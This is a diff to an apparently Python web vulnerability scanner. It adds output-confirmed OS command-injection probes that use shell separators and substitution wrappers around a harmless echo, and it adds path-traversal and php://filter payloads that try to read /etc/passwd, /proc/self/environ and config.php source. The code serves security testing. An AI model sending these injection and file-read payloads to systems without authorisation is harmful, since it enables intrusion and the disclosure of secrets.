@@ -15,6 +15,7 @@ import re
 import hmac
 import json
 import time
+import uuid
 import base64
 import hashlib
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
@@ -113,6 +114,59 @@ def check_cmd_injection(send, url):
     return out
 
 
+# ---- command injection by OUTPUT (not timing) ----------------------------
+# Separator-style injections and command-substitution wrappers. Confirmed when a
+# benign `echo <nonce>` yields the nonce in the response WHILE the literal
+# injected text does NOT appear — proof the command ran, not that input echoed.
+# Payload builders. Each takes (base, nonce) -> the full parameter value. "direct"
+# forms make the whole value the command (the param *is* a command, e.g. a spawn
+# endpoint); separator/wrapper forms break out of a fixed command.
+CMDO_BUILDERS = [
+    ("direct",    lambda b, n: f"echo {n}"),
+    ("direct",    lambda b, n: f"/bin/echo {n}"),
+    ("separator", lambda b, n: f"{b};echo {n}"),
+    ("separator", lambda b, n: f"{b}|echo {n}"),
+    ("separator", lambda b, n: f"{b}&&echo {n}"),
+    ("separator", lambda b, n: f"{b}%0aecho {n}"),
+    ("wrapper",   lambda b, n: f"{b}$(echo {n})"),
+    ("wrapper",   lambda b, n: f"{b}`echo {n}`"),
+]
+
+
+def check_cmd_output(send, url):
+    """Command execution confirmed by OUTPUT: an injected `echo <nonce>` yields
+    the nonce in the response WHILE the program word 'echo' and the literal
+    payload do NOT appear — proof the string was run, not reflected. Covers both
+    direct command execution (the param is the command) and injection breakout."""
+    _, q = _params(url)
+    out = []
+    for key in q:
+        base = (q[key][0] if q[key] else "x")
+        hit = None
+        for _kind, build in CMDO_BUILDERS:
+            nonce = "cmo" + uuid.uuid4().hex[:10]
+            payload = build(base, nonce)
+            tu = _set_param(url, key, payload)
+            r = send("GET", tu)
+            if not r.get("ok"):
+                continue
+            body = r.get("text") or ""
+            if nonce in body and f"echo {nonce}" not in body and payload not in body:
+                hit = (tu, body, payload)
+                break
+        if hit:
+            tu, body, payload = hit
+            out.append(_f(
+                f"OS command execution via '{key}'", "hunt-rce",
+                "critical", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "confirmed",
+                f"Parameter '{key}' reaches a command interpreter: the payload {payload!r} ran an "
+                f"`echo` whose unique output appeared in the response, while the literal command text "
+                f"was not reflected — arbitrary OS commands can be executed.",
+                f"GET {tu}; the response contains the echoed command output.",
+                f"GET {tu}", body[:800]))
+    return out
+
+
 # ---- SSTI (computed arithmetic) ------------------------------------------
 SSTI_TMPL = ["{{{{{a}*{b}}}}}", "${{{a}*{b}}}", "#{{{a}*{b}}}", "<%= {a}*{b} %>",
              "{{{{{a}.__class__}}}}"]
@@ -142,8 +196,38 @@ def check_ssti(send, url):
 # ---- LFI / path traversal -------------------------------------------------
 LFI_PAYLOADS = ["../../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
                 "/etc/passwd", "..\\..\\..\\..\\..\\windows\\win.ini",
-                "....\\\\....\\\\windows\\win.ini"]
+                "....\\\\....\\\\windows\\win.ini",
+                "../../../../../../../../etc/hosts", "/etc/hosts",
+                "../../../../../../../../proc/self/environ", "/proc/self/environ",
+                "file:///etc/passwd",
+                "php://filter/convert.base64-encode/resource=index.php",
+                "php://filter/convert.base64-encode/resource=config.php"]
 PASSWD_RE = re.compile(r"root:.*:0:0:", re.M)
+HOSTS_RE = re.compile(r"(?m)^\s*127\.0\.0\.1\s+localhost")
+_B64_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
+
+
+def _lfi_sig(body, payload):
+    """Deterministic file-content signature, or None."""
+    low = body.lower()
+    if PASSWD_RE.search(body):
+        return "/etc/passwd"
+    if "[extensions]" in low or "[fonts]" in low:
+        return "win.ini"
+    if HOSTS_RE.search(body):
+        return "/etc/hosts"
+    if "path=" in low and ("home=" in low or "pwd=" in low) and "\x00" not in body[:1]:
+        return "/proc/self/environ"
+    if "php://filter" in payload:                 # base64 that decodes to source
+        m = _B64_RE.search(body)
+        if m:
+            try:
+                dec = base64.b64decode(m.group(0) + "===")[:128]
+                if b"<?php" in dec or b"<?xml" in dec or b"<?=" in dec:
+                    return "php://filter source disclosure"
+            except Exception:
+                pass
+    return None
 
 
 def check_lfi(send, url):
@@ -155,7 +239,7 @@ def check_lfi(send, url):
             if not r.get("ok"):
                 continue
             body = r.get("text") or ""
-            sig = "/etc/passwd" if PASSWD_RE.search(body) else ("win.ini" if "[extensions]" in body.lower() else None)
+            sig = _lfi_sig(body, p)
             if sig:
                 tu = _set_param(url, key, p)
                 out.append(_f(
